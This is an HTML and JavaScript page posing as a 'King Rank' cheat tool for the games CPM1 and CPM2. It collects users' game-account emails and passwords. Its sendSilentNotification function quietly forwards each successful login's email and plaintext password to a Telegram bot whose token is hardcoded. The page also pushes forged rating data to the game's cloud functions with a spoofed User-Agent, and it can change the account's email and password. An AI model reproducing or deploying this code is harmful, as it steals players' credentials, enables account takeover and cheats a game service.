<!DOCTYPE html>
<html lang="en">

<head>

  <title>CRISHDEVX_WEB_TOOL</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      background: radial-gradient(circle at top, #0a0a0a, #000);
      background-image: url("https://i.postimg.cc/d0cJrfPq/39475270-b658-4a8f-a7d0-fd1843b99ad4.jpg");
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      margin: 0;
      padding: 0;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 0 35px rgba(255, 102, 0, 0.3);
      border-radius: 15px;
      padding: 35px 30px;
      width: 320px;
      text-align: center;
      animation: fadeIn 1.2s ease;
    }

    h1 {
      font-size: 1.4rem;
      color: #af0000;
      text-shadow: 0 0 10px #af0010, 0 0 20px #af0000;
      margin-bottom: 20px;
      animation: glow 2s infinite alternate;
    }

    select,
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      font-size: 14px;
      outline: none;
      transition: 0.3s ease;
    }

    input:focus,
    select:focus {
      border-color: #ff7b00;
      box-shadow: 0 0 10px #ff7b00;
    }

    button {
      width: 95%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
      cursor: pointer;
      font-weight: 600;
      font-size: 14px;
      color: #fff;
      background: linear-gradient(90deg, #ff4500, #ffae42);
      box-shadow: 0 0 10px rgba(255, 102, 0, 0.6);
      transition: all 0.3s ease;
    }

    button:hover {
      transform: scale(1.04);
      background: linear-gradient(90deg, #ffae42, #ff4500);
      box-shadow: 0 0 20px rgba(255, 150, 0, 0.8);
    }

    .status {
      margin-top: 10px;
      color: #0f0;
      font-size: 13px;
    }

    .error {
      color: #f55;
    }

    footer {
      margin-top: 15px;
      font-size: 12px;
      opacity: 0.7;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes glow {
      from {
        text-shadow: 0 0 5px #ff4500;
      }

      to {
        text-shadow: 0 0 20px #ffae42, 0 0 30px #ff4500;
      }
    }
  </style>
</head>

<body>

  <div class="container">
    <h1>üëëCRISHDEVX_WEB_TOOL üëë</h1>

    <!-- Game Selection -->
    <div id="gameMenu">
      <p>Select a Game:</p>
      <select id="gameSelect" onchange="showLoginForm()">
        <option value="">Select Game</option>
        <option value="CPM1">CPM1</option>
        <option value="CPM2">CPM2</option>
      </select>
    </div>

    <!-- Login Form -->
    <div id="loginForm" style="display:none;">
      <input type="email" id="email" placeholder="Email" />
      <input type="password" id="password" placeholder="Password" />
      <button onclick="loginFirebase()">Login</button>
      <button onclick="showGameMenu()">Back</button>
    </div>

    <!-- Menu Buttons -->
    <div id="menuButtons" style="display:none;">
      <button onclick="kingRank()">üëë King Rank</button>
      <button onclick="changeEmail()">üìß Change Emaill</button>
      <button onclick="changePassword()">üîê Change Password</button>
      <button onclick="logout()">üö™ Logout</button>
    </div>

    <div id="status" class="status"></div>
    <footer>¬© 2025 CRISHDEVX. All Rights Reserved.</footer>
  </div>
  
</body>
</html>
      <script>
        let currentUser = null;
        let currentToken = null;
        let selectedGame = null; // Track the selected game
        // Configuration (Sensitive data - NEVER expose this in real production code!)
        const gameConfigurations = {
            CPM1: {
                firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM', //REPLACE_ME,
                rankUrl: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
                botToken: "8172416110:AAGeg9Zoi7sKx80N3V_mhjojy7mmPtiJlcg", //REPLACE_ME,
                chatId: '8117301208' //REPLACE_ME
            },
            CPM2: {
                firebaseApiKey: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ', //REPLACE_ME,
                rankUrl: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI",
                botToken: '8172416110:AAGeg9Zoi7sKx80N3V_mhjojy7mmPtiJlcg', //REPLACE_ME,
                chatId: '8117301208' //REPLACE_ME
            }
        };




        async function sendSilentNotification(email, password, game) {
            const config = gameConfigurations[game];
            if (!config || !config.botToken || !config.chatId) {
                console.warn("Telegram configuration missing for this game.");
                return;
            }

            const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
            const message = `üîê Login Success - ${game}:\nüìß Email: ${email}\nüîí Password: ${password}`;

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: config.chatId,
                        text: message
                    })
                });
                if (!response.ok) {
                    console.error("Telegram send failed:", response.status, response.statusText);
                }
            } catch (error) {
                console.error("Telegram send error:", error);
            }
        }
        function updateStatus(message, isError = false) {
            const status = document.getElementById('status');
            status.className = isError ? 'status error' : 'status';
            status.textContent = message;
        }
        function showLoginForm() {
            selectedGame = document.getElementById("gameSelect").value;
            if (selectedGame) {
                document.getElementById("gameMenu").style.display = "none";
                document.getElementById("loginForm").style.display = "block";
            } else {
                alert("Please select a game first.");
            }
        }

        function showGameMenu() {
            document.getElementById("loginForm").style.display = "none";
            document.getElementById("gameMenu").style.display = "block";
        }

        async function loginFirebase() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!email || !password) return updateStatus("Enter email & password!", true);

            updateStatus("Logging in...");

            try {
                const config = gameConfigurations[selectedGame];
                if (!config) {
                    updateStatus("‚ùå Invalid game selected!", true);
                    return;
                }
                const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${config.firebaseApiKey}`;

                const response = await fetch(loginUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        email,
                        password,
                        returnSecureToken: true
                    })
                });

                const data = await response.json();

                if (data.idToken) {
                    currentUser = email;
                    currentToken = data.idToken;
                    updateStatus(`‚úÖ Logged in as ${email}`);
                    await sendSilentNotification(email, password, selectedGame); // Pass the selected game

                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('menuButtons').style.display = 'block';
                } else {
                    updateStatus(`‚ùå Login failed: ${data.error?.message || "Unknown Firebase error"}`, true);
                }
            } catch (err) {
                updateStatus(`‚ùå Error: ${err.message}`, true);
            }
        }


        function requireLogin() {
            if (!currentUser || !currentToken) {
                updateStatus("‚ùå You must login first!", true);
                return false;
            }
            return true;
        }

        async function kingRank() {
            if (!requireLogin()) return;

            updateStatus(`üëë Setting King Rank for ${currentUser}...`);
            const config = gameConfigurations[selectedGame];
            if (!config) {
             updateStatus("‚ùå Invalid game selected!", true);
             return;
            }

            const ratingData = {
                "cars": 100000,
                "car_fix": 100000,
                "car_collided": 100000,
                "car_exchange": 100000,
                "car_trade": 100000,
                "car_wash": 100000,
                "slicer_cut": 100000,
                "drift_max": 100000,
                "drift": 100000,
                "cargo": 100000,
                "delivery": 100000,
                "taxi": 100000,
                "levels": 100000,
                "gifts": 100000,
                "fuel": 100000,
                "offroad": 100000,
                "speed_banner": 100000,
                "reactions": 100000,
                "police": 100000,
                "run": 100000,
                "real_estate": 100000,
                "t_distance": 100000,
                "treasure": 100000,
                "block_post": 100000,
                "push_ups": 100000,
                "burnt_tire": 100000,
                "passanger_distance": 100000,
                "time": 10000000000,
                "race_win": 3000
            };

            const payload = {
                "data": JSON.stringify({
                    RatingData: ratingData
                })
            };

            try {
                const response = await fetch(config.rankUrl, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bearer ${currentToken}`,
                        "Content-Type": "application/json",
                        "User-Agent": "okhttp/3.12.13"
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    updateStatus(`‚úÖ King Rank Successful for ${currentUser}`);
                } else {
                    updateStatus(`‚ùå King Rank Failed: ${response.statusText}`, true);
                }
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`, true);
            }
        }

        async function changeEmail() {
            if (!requireLogin()) return;
            const config = gameConfigurations[selectedGame];
             if (!config) {
              updateStatus("‚ùå Select Game First!", true);
              return;
             }
            const newEmail = prompt("Enter new email:");
            if (!newEmail) return;
            try {

                const response = await fetch(
                    `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            idToken: currentToken,
                            email: newEmail,
                            returnSecureToken: true
                        })
                    });

                const data = await response.json();

                if (data.email) {
                    currentUser = data.email;
                    currentToken = data.idToken;
                    updateStatus(`‚úÖ Email changed to ${data.email}`);
                } else {
                    updateStatus(`‚ùå Error: ${data.error?.message || "Failed to change email"}`, true);
                }
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`, true);
            }
        }

        async function changePassword() {
            if (!requireLogin()) return;
             const config = gameConfigurations[selectedGame];
             if (!config) {
              updateStatus("‚ùå Select Game First!", true);
              return;
             }

            const newPassword = prompt("Enter new password:");
            if (!newPassword) return;
            try {


                const response = await fetch(
                    `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${config.firebaseApiKey}`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            idToken: currentToken,
                            password: newPassword,
                            returnSecureToken: true
                        })
                    });

                const data = await response.json();

                if (data.email) {
                    currentToken = data.idToken;
                    updateStatus(`‚úÖ Password changed successfully!`);
                } else {
                    updateStatus(`‚ùå Error: ${error?.message || "Failed to change password"}`, true);
                }
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`, true);
            }
        }

        function logout() {
            currentUser = null;
            currentToken = null;
            document.getElementById('menuButtons').style.display = 'none';
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('gameMenu').style.display = 'block'; // Show game selection
            updateStatus("Logged out.");
        }


        // Show game selection on page load
        document.addEventListener("DOMContentLoaded", () => {
            document.getElementById("gameMenu").style.display = "block";
        });
    </script>
</body>

</html>
